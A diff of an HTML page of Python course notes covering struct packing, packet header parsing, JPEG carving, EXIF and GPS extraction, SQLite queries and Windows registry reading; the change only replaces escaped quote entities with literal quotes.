@@ -1460,76 +1699,76 @@ b'\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x
 # format chararcters: https://docs.python.org/3/library/struct.html
 </code></pre>
 <h4 id="step-2---struckt-unpack"><a class="header" href="#step-2---struckt-unpack">Step 2 - Struckt Unpack</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; struct.unpack(&quot;&gt;BB&quot;, b&quot;\xff\x00&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; struct.unpack("&gt;BB", b"\xff\x00")
 (255, 0)
 # big-endian to extract two bytes into a tuple
-&gt;&gt;&gt; struct.unpack(&quot;&lt;BB&quot;, b&quot;\xff\x00&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;BB", b"\xff\x00")
 (255, 0)
 # for single bytes of data the endianness does not matter
-&gt;&gt;&gt; struct.unpack(&quot;&lt;bB&quot;, b&quot;\xff\x00&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;bB", b"\xff\x00")
 (-1, 0)
 # treat it as a signed integer
-&gt;&gt;&gt; struct.unpack(&quot;&lt;H&quot;, b&quot;\xff\x00&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;H", b"\xff\x00")
 (255,)
 # H interprets 2 bytes so endianness matters
-&gt;&gt;&gt; struct.unpack(&quot;&gt;H&quot;, b&quot;\xff\x00&quot;)
+&gt;&gt;&gt; struct.unpack("&gt;H", b"\xff\x00")
 (65280,)
 # big-endian
-&gt;&gt;&gt; struct.unpack(&quot;&gt;h&quot;, b&quot;\xff\x00&quot;)
+&gt;&gt;&gt; struct.unpack("&gt;h", b"\xff\x00")
 (-256,)
 # big-endian but it is a signed integer
-&gt;&gt;&gt; struct.unpack(&quot;&gt;3s&quot;, b&quot;\xff\x00\x41&quot;)
+&gt;&gt;&gt; struct.unpack("&gt;3s", b"\xff\x00\x41")
 (b'\xff\x00A',)
 # s for string but it really collects bytes
-&gt;&gt;&gt; struct.unpack(&quot;&lt;cccc&quot;, b&quot;\x01\x41\x42\x43&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;cccc", b"\x01\x41\x42\x43")
 (b'\x01', b'A', b'B', b'C')
 # extract 4 bytes as 4 chars
-&gt;&gt;&gt; struct.unpack(&quot;&lt;4c&quot;, b&quot;\x01\x41\x42\x43&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;4c", b"\x01\x41\x42\x43")
 (b'\x01', b'A', b'B', b'C')
-&gt;&gt;&gt; struct.unpack(&quot;&lt;4B&quot;, b&quot;\x01\x41\x42\x43&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;4B", b"\x01\x41\x42\x43")
 (1, 65, 66, 67)
 # extract 4 bytes as 4 single byte integers
-&gt;&gt;&gt; struct.unpack(&quot;&lt;BxxB&quot;, b&quot;\x01\x41\x42\x43&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;BxxB", b"\x01\x41\x42\x43")
 (1, 67)
 # extract a byte, ignore a byte, ignore another byte, extract a byte
-&gt;&gt;&gt; struct.unpack(&quot;&lt;B2xB&quot;, b&quot;\x01\x41\x42\x43&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;B2xB", b"\x01\x41\x42\x43")
 (1, 67)
 # extract a byte, ignore two bytes, extract a byte
-&gt;&gt;&gt; struct.unpack(&quot;&lt;I&quot;, b&quot;\x01\x41\x42\x43&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;I", b"\x01\x41\x42\x43")
 (1128415489,)
 # extract all 4 bytes as an unsigned integer
-&gt;&gt;&gt; struct.unpack(&quot;&lt;5c&quot;, b&quot;\x48\x45\x4c\x4c\x4f&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;5c", b"\x48\x45\x4c\x4c\x4f")
 (b'H', b'E', b'L', b'L', b'O')
-&gt;&gt;&gt; struct.unpack(&quot;&lt;5s&quot;, b&quot;\x48\x45\x4c\x4c\x4f&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;5s", b"\x48\x45\x4c\x4c\x4f")
 (b'HELLO',)
 </code></pre>
 <h4 id="step-2---unpacking-bits-as-flags"><a class="header" href="#step-2---unpacking-bits-as-flags">Step 2 - Unpacking Bits as Flags</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; list(itertools.compress([&quot;BIT0&quot;,&quot;BIT1&quot;,&quot;BIT2&quot;], [1,0,1]))
+<pre><code class="language-python">&gt;&gt;&gt; list(itertools.compress(["BIT0","BIT1","BIT2"], [1,0,1]))
 ['BIT0', 'BIT2']
 # takes to lists
 # anwhere there is a 1 in the second list, the value in the corresponding position in the first list is kept
-&gt;&gt;&gt; format(147, &quot;08b&quot;)
+&gt;&gt;&gt; format(147, "08b")
 '10010011'
-&gt;&gt;&gt; list(map(int,format(147, &quot;08b&quot;)))
+&gt;&gt;&gt; list(map(int,format(147, "08b")))
 [1, 0, 0, 1, 0, 0, 1, 1]
 # to create a list of bits
 &gt;&gt;&gt; def tcp_flags_as_str(flag):
 ...     tcp_flags = ['CWR', 'ECE', 'URG', 'ACK', 'PSH', 'RST', 'SYN', 'FIN']
-...     return &quot;|&quot;.join(list(itertools.compress(tcp.flags,map(int,format(flag,&quot;08b&quot;)))))
+...     return "|".join(list(itertools.compress(tcp.flags,map(int,format(flag,"08b")))))
 # combining both to converting byte flags to words
 </code></pre>
 <h4 id="step-2---struct-pack"><a class="header" href="#step-2---struct-pack">Step 2 - Struct Pack</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; struct.pack(&quot;&lt;h&quot;, -5)
+<pre><code class="language-python">&gt;&gt;&gt; struct.pack("&lt;h", -5)
 b'\xfb\xff'
-&gt;&gt;&gt; struct.pack(&quot;&lt;h&quot;, 5)
+&gt;&gt;&gt; struct.pack("&lt;h", 5)
 b'\x05\x00'
-&gt;&gt;&gt; struct.pack(&quot;&gt;h&quot;, 5)
+&gt;&gt;&gt; struct.pack("&gt;h", 5)
 b'\x00\x05'
-&gt;&gt;&gt; struct.pack(&quot;&gt;I&quot;, 5)
+&gt;&gt;&gt; struct.pack("&gt;I", 5)
 b'\x00\x00\x00\x05'
-&gt;&gt;&gt; struct.pack(&quot;&gt;Q&quot;, 5)
+&gt;&gt;&gt; struct.pack("&gt;Q", 5)
 b'\x00\x00\x00\x00\x00\x00\x00\x05'
-&gt;&gt;&gt; struct.pack(&quot;&lt;4B6sI&quot;, 1,2,0x41,0x42,b&quot;SEC573&quot;,5)
+&gt;&gt;&gt; struct.pack("&lt;4B6sI", 1,2,0x41,0x42,b"SEC573",5)
 b'\x01\x02ABSEC573\x05\x00\x00\x00'
 # input values are comma-seperated arguments
 </code></pre>
@@ -1538,7 +1777,7 @@ b'\x01\x02ABSEC573\x05\x00\x00\x00'
 &gt;&gt;&gt; while True:
 ...     data = s.recv(65535)
 ...     eth_dst,eth_src,eth_type = struct.unpack('!6s6sH', data[:14])
-...     print(&quot;ETH: SRC:{0} DST:{1} TYPE:{2}&quot;.format(codecs.encode(eth_src,&quot;hex&quot;), codecs.encode(&quot;eth_dst&quot;,&quot;hex&quot;), \
+...     print("ETH: SRC:{0} DST:{1} TYPE:{2}".format(codecs.encode(eth_src,"hex"), codecs.encode("eth_dst","hex"), \
 hex(eth_type)))
 # to capture ethernet header
 # all network traffic is big-endian, so it will start with a !
@@ -1548,12 +1787,12 @@ hex(eth_type)))
 ...     iph = struct.unpack('!BBHHHBBHII', data[14:34])
 ...     srcip = socket.inet_ntoa(struct.pack('I',iph[8]))
 ...     dstip = socket.inet_ntoa(struct.pack('I',iph[9]))
-...     print(f&quot;IP: SRC:{srcip} DST:{dstip} - {iph} &quot;)
+...     print(f"IP: SRC:{srcip} DST:{dstip} - {iph} ")
 </code></pre>
 <h4 id="step-2---tcp-header-struct"><a class="header" href="#step-2---tcp-header-struct">Step 2 - TCP Header Struct</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; while True:
 ...     tcp = struct.unpack('!HHIIBBHHH', embedded_data[:20])
-...     print(&quot;TCP: &quot;, tcp)
+...     print("TCP: ", tcp)
 </code></pre>
 <h4 id="step-2---udp-header-struct"><a class="header" href="#step-2---udp-header-struct">Step 2 - UDP Header Struct</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; print(struct.unpack('!HHHH', embedded_data[:8]))
@@ -1561,16 +1800,16 @@ hex(eth_type)))
 <h4 id="step-2---icmp-header-struct"><a class="header" href="#step-2---icmp-header-struct">Step 2 - ICMP Header Struct</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; (icmp_type,icmp_code,icmp_chksum) = struct.unpack(r'!BBH', embedded_data[:4])
 &gt;&gt;&gt; if icmp_type == 0:
-...     print(f&quot;ICMP - PING REPLY SRC:{srcip} DST:{DSTIP}&quot;)
+...     print(f"ICMP - PING REPLY SRC:{srcip} DST:{DSTIP}")
 ... elif icmp_type == 8:
-...     print(f&quot;ICMP - PING REQUEST SRC:{srcip} DST:{dstip}&quot;)
+...     print(f"ICMP - PING REQUEST SRC:{srcip} DST:{dstip}")
 &gt;&gt;&gt; else:
-...     print(f&quot;ICMP - TYPE:{icmp_type} CODE:{icmp_code} - SRC:{srcip} DST: {dstip} DATA:{icmp_data}&quot;)
+...     print(f"ICMP - TYPE:{icmp_type} CODE:{icmp_code} - SRC:{srcip} DST: {dstip} DATA:{icmp_data}")
 </code></pre>
 <h4 id="step-3---use-regex-on-binary-data"><a class="header" href="#step-3---use-regex-on-binary-data">Step 3 - Use RegEx on Binary Data</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; def string2jpg(rawstring):
 ...     if not b'\xff\xd8' in rawstring or not b'\xff\xd9' in rawstring:
-...         print(&quot;ERROR: Invalid or corrupt image!&quot;, rawstring[:10])
+...         print("ERROR: Invalid or corrupt image!", rawstring[:10])
 ...         return None
 ...     jpg = re.findall(rb'\xff\xd8.*\xff\xd9', rawstring,re.DOTALL)[0]
 ...     return jpg
@@ -1601,12 +1840,12 @@ Successfully installed Pillow-11.2.1
 </code></pre>
 <h4 id="opening-images-with-pil"><a class="header" href="#opening-images-with-pil">Opening Images with PIL</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; imagedata = Image.open(&quot;PIvfevco6UTNU69s-YaIUFqA.jpeg&quot;)
+&gt;&gt;&gt; imagedata = Image.open("PIvfevco6UTNU69s-YaIUFqA.jpeg")
 &gt;&gt;&gt; imagedata.show()
 # opens the image when saved on disk
 &gt;&gt;&gt; from io import BytesIO
 &gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; img = open(&quot;PIvfevco6UTNU69s-YaIUFqA.jpeg&quot;, &quot;rb&quot;).read()
+&gt;&gt;&gt; img = open("PIvfevco6UTNU69s-YaIUFqA.jpeg", "rb").read()
 &gt;&gt;&gt; Image.open(BytesIO(img)).show()
 # opens the image when saved inside variable
 </code></pre>
@@ -1623,7 +1862,7 @@ Successfully installed Pillow-11.2.1
 </code></pre>
 <h4 id="listing-metadata-1"><a class="header" href="#listing-metadata-1">Listing Metadata 1</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; imgobj = Image.open(&quot;test.jpg&quot;)
+&gt;&gt;&gt; imgobj = Image.open("test.jpg")
 &gt;&gt;&gt; info = imgobj._getexif()
 &gt;&gt;&gt; print(info[272])
 Canon DIGITAL IXUS 400
@@ -1633,10 +1872,10 @@ Canon DIGITAL IXUS 400
 &gt;&gt;&gt; def print_exif(imageobject):
 ...     exifdict = imageobject._getexif()
 ...     for exif_num, data in exifdict.items():
-...         tag_name = TAGS.get(exif_num, &quot;Unknown Tag&quot;)
-...         print(f&quot;TAG: {exif_num} ({tag_name}) is assigned {data}&quot;)
+...         tag_name = TAGS.get(exif_num, "Unknown Tag")
+...         print(f"TAG: {exif_num} ({tag_name}) is assigned {data}")
 ...         
-&gt;&gt;&gt; imgobj = Image.open(&quot;test.jpg&quot;)
+&gt;&gt;&gt; imgobj = Image.open("test.jpg")
 &gt;&gt;&gt; print_exif(imgobj)
 TAG: 296 (ResolutionUnit) is assigned 2
 TAG: 34665 (ExifOffset) is assigned 200
@@ -1676,11 +1915,11 @@ TAG: 41986 (ExposureMode) is assigned 0
 TAG: 40960 (FlashPixVersion) is assigned b'0100'
 TAG: 41987 (WhiteBalance) is assigned 0
 TAG: 41988 (DigitalZoomRatio) is assigned 1.0
-TAG: 37500 (MakerNote) is assigned b'\x0e\x00\x00\x00\x03\x00\x06\x00\x00\x00L\x03\x00\x00\x00\x00\x03\x00\x04\x00\x00\x00X\x03\x00\x00\x01\x00\x03\x00.\x00\x00\x00`\x03\x00\x00\x02\x00\x03\x00\x04\x00\x00\x00\xbc\x03\x00\x00\x03\x00\x03\x00\x04\x00\x00\x00\xc4\x03\x00\x00\x04\x00\x03\x00&quot;\x00\x00\x00\xcc\x03\x00\x00\x06\x00\x02\x00 \x00\x00\x00\x10\x04\x00\x00\x07\x00\x02\x00\x18\x00\x00\x000\x04\x00\x00\x08\x00\x04\x00\x01\x00\x00\x00y\xf5\x12\x00\t\x00\x02\x00 \x00\x00\x00H\x04\x00\x00\r\x00\x03\x00&quot;\x00\x00\x00h\x04\x00\x00\x10\x00\x04\x00\x01\x00\x00\x00\x00\x00\'\x01\x12\x00\x03\x00\x1c\x00\x00\x00\xac\x04\x00\x00\x13\x00\x03\x00\x04\x00\x00\x00\xe4\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x00\x02\x00\x00\x00\x03\x00\x01\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x03\x00\x01\x00\x01@\x00\x00\xff\xff\xff\xff\xc7\x02\xed\x00 \x00\x82\x00\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\xe0\x08\xe0\x08\x00\x00\x01\x00\x00\x00\x00\x00\xff\x7f\x00\x00\x00\x00\x00\x00\x02\x00\xee\x01\x1e\x01\xd7\x00\x00\x04\x00\x00\x00\x00\x00\x00D\x00\x00\x00\x80\x00O\x01\xd5\x00\xf5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xd8\x00\x00\x00\xd7\x00\xf3\x00\x00\x00\x00\x00\x00\x00\xfa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00IMG:DIGITAL IXUS 400 JPEG\x00\x00\x00\x00\x00\x00\x00Firmware Version 1.00\x00\x00\x00Jean-Pierre Grignon\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\t\x00\xf8\x00\xf7\x00\xfa\x00\xfb\x00\xf9\x00\xf9\x00\xfa\x00\xf7\x00\xfa\x00@\x00\x00\x00\x00\x00q\x00\x00\x00\x00\x00\n\x00\x05\x00\x01\x00\n\x00Y\x00K\x01\x07\x00\xfb\xff\xfb\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\t\x00\t\x00\xe0\x08\xa8\x06\xe0\x08\xd4\x00\x99\x01&amp;\x00f\xfe\x00\x00\x9a\x01f\xfe\x00\x00\x9a\x01f\xfe\x00\x00\x9a\x01\xd7\xff\xd7\xff\xd7\xff\x00\x00\x00\x00\x00\x00)\x00)\x00)\x00\x08\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+TAG: 37500 (MakerNote) is assigned b'\x0e\x00\x00\x00\x03\x00\x06\x00\x00\x00L\x03\x00\x00\x00\x00\x03\x00\x04\x00\x00\x00X\x03\x00\x00\x01\x00\x03\x00.\x00\x00\x00`\x03\x00\x00\x02\x00\x03\x00\x04\x00\x00\x00\xbc\x03\x00\x00\x03\x00\x03\x00\x04\x00\x00\x00\xc4\x03\x00\x00\x04\x00\x03\x00"\x00\x00\x00\xcc\x03\x00\x00\x06\x00\x02\x00 \x00\x00\x00\x10\x04\x00\x00\x07\x00\x02\x00\x18\x00\x00\x000\x04\x00\x00\x08\x00\x04\x00\x01\x00\x00\x00y\xf5\x12\x00\t\x00\x02\x00 \x00\x00\x00H\x04\x00\x00\r\x00\x03\x00"\x00\x00\x00h\x04\x00\x00\x10\x00\x04\x00\x01\x00\x00\x00\x00\x00\'\x01\x12\x00\x03\x00\x1c\x00\x00\x00\xac\x04\x00\x00\x13\x00\x03\x00\x04\x00\x00\x00\xe4\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x00\x02\x00\x00\x00\x03\x00\x01\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x03\x00\x01\x00\x01@\x00\x00\xff\xff\xff\xff\xc7\x02\xed\x00 \x00\x82\x00\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\xe0\x08\xe0\x08\x00\x00\x01\x00\x00\x00\x00\x00\xff\x7f\x00\x00\x00\x00\x00\x00\x02\x00\xee\x01\x1e\x01\xd7\x00\x00\x04\x00\x00\x00\x00\x00\x00D\x00\x00\x00\x80\x00O\x01\xd5\x00\xf5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xd8\x00\x00\x00\xd7\x00\xf3\x00\x00\x00\x00\x00\x00\x00\xfa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00IMG:DIGITAL IXUS 400 JPEG\x00\x00\x00\x00\x00\x00\x00Firmware Version 1.00\x00\x00\x00Jean-Pierre Grignon\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\t\x00\xf8\x00\xf7\x00\xfa\x00\xfb\x00\xf9\x00\xf9\x00\xfa\x00\xf7\x00\xfa\x00@\x00\x00\x00\x00\x00q\x00\x00\x00\x00\x00\n\x00\x05\x00\x01\x00\n\x00Y\x00K\x01\x07\x00\xfb\xff\xfb\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\t\x00\t\x00\xe0\x08\xa8\x06\xe0\x08\xd4\x00\x99\x01&amp;\x00f\xfe\x00\x00\x9a\x01f\xfe\x00\x00\x9a\x01f\xfe\x00\x00\x9a\x01\xd7\xff\xd7\xff\xd7\xff\x00\x00\x00\x00\x00\x00)\x00)\x00)\x00\x08\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00'
 TAG: 41990 (SceneCaptureType) is assigned 0
 </code></pre>
 <h4 id="convert-exif-gps-to-decimal-degrees"><a class="header" href="#convert-exif-gps-to-decimal-degrees">Convert Exif GPS to Decimal Degrees</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; imgobj = Image.open(&quot;DSCN0021.jpg&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; imgobj = Image.open("DSCN0021.jpg")
 &gt;&gt;&gt; def coordinates(ImageObject):
 ...     info = ImageObject._getexif()
 ...     if not info or not info.get(34853):
@@ -1706,7 +1945,7 @@ TAG: 41990 (SceneCaptureType) is assigned 0
 <pre><code class="language-python"># generate URL to google maps
 # https://maps.google.com/maps?q=lat,long&amp;z=15
 &gt;&gt;&gt; lat, lon = coordinates(imgobj)
-&gt;&gt;&gt; print(f&quot;https://maps.google.com/maps?q={lat},{lon}&amp;z=15&quot;)
+&gt;&gt;&gt; print(f"https://maps.google.com/maps?q={lat},{lon}&amp;z=15")
 https://maps.google.com/maps?q=43.467081666663894,11.884538333330555&amp;z=15
 </code></pre>
 <h3 id="python-database-operations"><a class="header" href="#python-database-operations">Python Database Operations</a></h3>
@@ -1717,28 +1956,28 @@ https://maps.google.com/maps?q=43.467081666663894,11.884538333330555&amp;z=15
 # Oracle: python-oracledb, cx_Oracle, pyodbc
 # SQLITE: sqlite3 is bubilt into python, pyodbc
 &gt;&gt;&gt; import pyodbc
-&gt;&gt;&gt; connection = pyodbc.connect(&quot;Driver={SQL Server Native Client 11.0};&quot;
-... &quot;Server = server_name;&quot;
-... &quot;Database = db_name;&quot;
-... &quot;Trusted_Connection = yes;&quot;)
+&gt;&gt;&gt; connection = pyodbc.connect("Driver={SQL Server Native Client 11.0};"
+... "Server = server_name;"
+... "Database = db_name;"
+... "Trusted_Connection = yes;")
 &gt;&gt;&gt; cursor = connection.cursor()
 &gt;&gt;&gt; cursor.execute('SELECT * FROM Table')
 &gt;&gt;&gt; for row in cursor:
-...     print(f&quot;row = {row}&quot;)
+...     print(f"row = {row}")
 </code></pre>
 <h4 id="sqlite3-connect-and-retrieve-table-and-column-names"><a class="header" href="#sqlite3-connect-and-retrieve-table-and-column-names">Sqlite3 Connect and Retrieve Table and Column Names</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import sqlite3
-&gt;&gt;&gt; db = sqlite3.connect(&quot;chinook.db&quot;)
-&gt;&gt;&gt; list(db.execute(&quot;select name from sqlite_master where type='table';&quot;))
+&gt;&gt;&gt; db = sqlite3.connect("chinook.db")
+&gt;&gt;&gt; list(db.execute("select name from sqlite_master where type='table';"))
 [('albums',), ('sqlite_sequence',), ('artists',), ('customers',), ('employees',), ('genres',), ('invoices',), ('invoice_items',), ('media_types',), ('playlists',), ('playlist_track',), ('tracks',), ('sqlite_stat1',)]
-&gt;&gt;&gt; list(db.execute(&quot;select sql from sqlite_master where name='invoices';&quot;))
-[('CREATE TABLE &quot;invoices&quot;\r\n(\r\n    [InvoiceId] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,\r\n    [CustomerId] INTEGER  NOT NULL,\r\n    [InvoiceDate] DATETIME  NOT NULL,\r\n    [BillingAddress] NVARCHAR(70),\r\n    [BillingCity] NVARCHAR(40),\r\n    [BillingState] NVARCHAR(40),\r\n    [BillingCountry] NVARCHAR(40),\r\n    [BillingPostalCode] NVARCHAR(10),\r\n    [Total] NUMERIC(10,2)  NOT NULL,\r\n    FOREIGN KEY ([CustomerId]) REFERENCES &quot;customers&quot; ([CustomerId]) \r\n\t\tON DELETE NO ACTION ON UPDATE NO ACTION\r\n)',)]
+&gt;&gt;&gt; list(db.execute("select sql from sqlite_master where name='invoices';"))
+[('CREATE TABLE "invoices"\r\n(\r\n    [InvoiceId] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,\r\n    [CustomerId] INTEGER  NOT NULL,\r\n    [InvoiceDate] DATETIME  NOT NULL,\r\n    [BillingAddress] NVARCHAR(70),\r\n    [BillingCity] NVARCHAR(40),\r\n    [BillingState] NVARCHAR(40),\r\n    [BillingCountry] NVARCHAR(40),\r\n    [BillingPostalCode] NVARCHAR(10),\r\n    [Total] NUMERIC(10,2)  NOT NULL,\r\n    FOREIGN KEY ([CustomerId]) REFERENCES "customers" ([CustomerId]) \r\n\t\tON DELETE NO ACTION ON UPDATE NO ACTION\r\n)',)]
 </code></pre>
 <h4 id="sqlite3-query-the-records-from-the-database"><a class="header" href="#sqlite3-query-the-records-from-the-database">Sqlite3 Query the Records from the Database</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import sqlite3
-&gt;&gt;&gt; db = sqlite3.connect(&quot;chinook.db&quot;)
-&gt;&gt;&gt; for eachrow in db.execute(&quot;SELECT invoices.InvoiceId, invoices.CustomerId, invoices.InvoiceDate, invoices.Billi\
-ngAddress from invoices;&quot;):
+&gt;&gt;&gt; db = sqlite3.connect("chinook.db")
+&gt;&gt;&gt; for eachrow in db.execute("SELECT invoices.InvoiceId, invoices.CustomerId, invoices.InvoiceDate, invoices.Billi\
+ngAddress from invoices;"):
 ...     print(eachrow)
 ...     
 (1, 2, '2009-01-01 00:00:00', 'Theodor-Heuss-Straße 34')
@@ -1768,12 +2007,12 @@ You should consider upgrading via the 'c:\users\melvi\desktop\sans\scripts\pytho
 
 (sans) C:\Users\melvi\Desktop\sans\Scripts&gt;python
 Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+Type "help", "copyright", "credits" or "license" for more information.
 &gt;&gt;&gt; from Registry.Registry import Registry
 </code></pre>
 <h4 id="components-of-registry"><a class="header" href="#components-of-registry">Components of Registry</a></h4>
-<pre><code class="language-python">handle = Registry(r&quot;path to registry file&quot;)
-regkey = handle.open(r&quot;raw str-path to key&quot;)
+<pre><code class="language-python">handle = Registry(r"path to registry file")
+regkey = handle.open(r"raw str-path to key")
 # key methods:
 # .path(), .value(), .subkey(), .subkeys()
 # value methods:
@@ -1782,44 +2021,44 @@ regkey = handle.open(r&quot;raw str-path to key&quot;)
 <h4 id="retrieving-one-specific-value-with-value-or-key-with-subkey"><a class="header" href="#retrieving-one-specific-value-with-value-or-key-with-subkey">Retrieving one specific Value with .value() or Key with .subkey()</a></h4>
 <pre><code class="language-python"># first open the registry file
 &gt;&gt;&gt; from Registry.Registry import Registry
-&gt;&gt;&gt; reg_hive = Registry(&quot;SOFTWARE_COPY&quot;)
+&gt;&gt;&gt; reg_hive = Registry("SOFTWARE_COPY")
 # then open the key that contains the value
-&gt;&gt;&gt; reg_key = reg_hive.open(r&quot;Microsoft\Windows NT\CurrentVersion&quot;)
+&gt;&gt;&gt; reg_key = reg_hive.open(r"Microsoft\Windows NT\CurrentVersion")
 # then pass the name of the value you want to retrieve to .value()
-&gt;&gt;&gt; reg_value = reg_key.value(&quot;ProductName&quot;)
+&gt;&gt;&gt; reg_value = reg_key.value("ProductName")
 &gt;&gt;&gt; reg_value.name()
 'ProductName'
 &gt;&gt;&gt; reg_value.value()
 'Windows 10 Pro'
 &gt;&gt;&gt; reg_value.value_type_str()
 'RegSZ'
-&gt;&gt;&gt; reg_key.value(&quot;ProductName&quot;).value()
+&gt;&gt;&gt; reg_key.value("ProductName").value()
 'Windows 10 Pro'
 # you can also open a specific subkey with .subkey()
-&gt;&gt;&gt; reg_key = reg_hive.open(r&quot;Microsoft\Windows NT&quot;)
-&gt;&gt;&gt; cur_ver_key = reg_key.subkey(&quot;CurrentVersion&quot;)
+&gt;&gt;&gt; reg_key = reg_hive.open(r"Microsoft\Windows NT")
+&gt;&gt;&gt; cur_ver_key = reg_key.subkey("CurrentVersion")
 &gt;&gt;&gt; cur_ver_key.name()
 'CurrentVersion'
 </code></pre>
 <h4 id="a-list-of-values-with-values-or-keys-with-subkeys"><a class="header" href="#a-list-of-values-with-values-or-keys-with-subkeys">A list of Values with .values() or Keys with .subkeys()</a></h4>
 <pre><code class="language-python"># once you have opnened a key, you can retrieve a list of its values with .values()
-&gt;&gt;&gt; reg_hive = Registry(&quot;SOFTWARE_COPY&quot;)
-&gt;&gt;&gt; reg_key = reg_hive.open(r&quot;Microsoft\Windows\CurrentVersion\Run&quot;)
+&gt;&gt;&gt; reg_hive = Registry("SOFTWARE_COPY")
+&gt;&gt;&gt; reg_key = reg_hive.open(r"Microsoft\Windows\CurrentVersion\Run")
 &gt;&gt;&gt; for eachkey in reg_key.values():
 ...     print(eachkey.name(), eachkey.value(), eachkey.value_type_str())
 ...
 SecurityHealth %windir%\system32\SecurityHealthSystray.exe RegExpandSZ
-RtkAudUService &quot;C:\Windows\System32\DriverStore\FileRepository\realtekservice.inf_amd64_9366beb5d0043df3\RtkAudUService64.exe&quot; -background RegSZ
+RtkAudUService "C:\Windows\System32\DriverStore\FileRepository\realtekservice.inf_amd64_9366beb5d0043df3\RtkAudUService64.exe" -background RegSZ
 # or you can retrieve a list of subkeys with .subkeys()
-&gt;&gt;&gt; reg_key = reg_hive.open(r&quot;Microsoft\Windows\CurrentVersion&quot;)
+&gt;&gt;&gt; reg_key = reg_hive.open(r"Microsoft\Windows\CurrentVersion")
 &gt;&gt;&gt; for eachsubkey in reg_key.subkeys():
-...     print(eachsubkey.name(), end=&quot;, &quot;)
+...     print(eachsubkey.name(), end=", ")
 ...
 AccountPicture, ActionCenter, AdvertisingInfo, App Management, App Paths, AppHost, Applets, ApplicationAssociationToasts, ApplicationFrame, AppModel, AppModelUnlock, AppReadiness, Appx, Audio, Authentication, AutoRotation, BackupAndRestoreSettings, BitLocker, BITS, Bluetooth, CapabilityAccessManager, Capture, Casting, Census, ClickNote, ClosedCaptioning, CloudDesktop, CloudExperienceHost, CloudStore, COAWOS, Communications, Component Based Servicing, ConnectedSearch, ContainerMappedPaths, Control Panel, Controls Folder, CPSS, DateTime, Device Installer, Device Metadata, DeviceAccess, DevicePicker, DeviceSetup, Diagnostics, DIFx, DIFxApp, DPX, DriverConfiguration, DriverSearching, EditionOverrides, EventCollector, EventForwarding, Explorer, Ext, Fcon, FileExplorer, FileHistory, FilePicker, FlightedFeatures, Flighting, GameInput, GameInstaller, Group Policy, HardwareIdentification, HelpAndSupport, Hints, Holographic, HoloSI, IME, ImmersiveShell, Installer, InstallService, Internet Settings, LanguageComponentsInstaller, LAPS, Lock Screen, Lxss, Management Infrastructure, Media Center, MicrosoftEdge, MMDevices, NcdAutoSetup, NetCache, NetworkServiceTriggers, Notifications, OEMInformation, OneSettings, OOBE, OpenWith, OptimalLayout, Parental Controls, PerceptionSimulationExtensions, Personalization, PhotoPropertyHandler, PlayReady, Policies, PowerEfficiencyDiagnostics, PrecisionTouchPad, PreviewHandlers, Privacy, PropertySystem, Proximity, PushNotifications, Reliability, rempl, ReserveManager, RetailDemo, Run, RunOnce, 